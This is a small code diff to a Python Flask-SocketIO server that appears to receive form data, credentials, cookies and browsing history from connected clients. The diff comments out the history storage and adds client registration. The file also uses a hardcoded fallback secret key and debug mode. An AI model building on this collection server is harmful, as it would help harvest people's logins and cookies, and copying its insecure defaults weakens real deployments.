@@ -9,7 +9,7 @@ app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET", "secret!")
 socketio = SocketIO(app)
 connected_clients = [] #tuples of (clientid, sid)
 
-import frontend
+#import frontend
 
 """
 Server responses to client: (int status, data) as tuple
@@ -92,6 +92,7 @@ if __name__ == "__main__":
         #database.store_form_data(data["forms"][0], clientid)
         #database.store_credential(data["creds"][0], clientid)
         #database.store_cookie(data["cookies"][0], clientid)
-        database.store_history(data["history"], clientid)
+        #database.store_history(data["history"], clientid)
+        database.create_new_client(data)
     socketio.run(app, debug=True)
 
